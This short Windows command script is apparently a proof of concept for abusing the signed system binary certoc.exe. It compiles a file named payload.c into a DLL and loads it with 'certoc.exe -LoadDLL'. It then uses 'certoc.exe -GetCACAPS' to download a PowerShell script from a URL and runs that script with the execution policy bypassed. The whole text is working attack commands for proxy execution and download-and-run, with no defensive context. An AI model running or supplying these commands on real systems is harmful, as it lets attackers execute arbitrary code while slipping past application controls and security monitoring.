call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat" x64 && "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe" /nologo /LD "C:\Temp\CertocExploit\payload.c" /Fe"C:\Temp\CertocExploit\payload.dll"
::or
::call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" x64 && "..." ...

C:\Windows\System32\certoc.exe -LoadDLL "C:\Temp\CertocExploit\payload.dll"

powershell.exe -Command "$url = 'http://127.0.0.1:8000/payload.ps1'; $tempFile = [System.IO.Path]::GetTempFileName() + '.ps1'; certoc.exe -GetCACAPS $url > $tempFile; powershell.exe -ExecutionPolicy Bypass -File $tempFile"

